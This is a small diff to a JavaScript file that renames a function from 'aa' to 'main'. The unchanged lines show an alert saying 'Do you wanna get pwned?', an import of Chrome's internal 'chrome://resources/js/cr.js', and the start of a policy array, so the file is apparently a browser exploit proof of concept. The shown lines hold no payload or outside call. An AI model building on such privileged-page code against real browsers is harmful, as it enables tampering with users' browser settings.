@@ -1,7 +1,5 @@
 alert("Do you wanna get pwned?");
-async function aa() {
-
-
+async function main() {
     let cr = await import('chrome://resources/js/cr.js');
     let policy = JSON.stringify([
         { 
@@ -39,4 +37,4 @@ async function aa() {
 
 }
 
-aa().catch(console.error);
+main().catch(console.error);
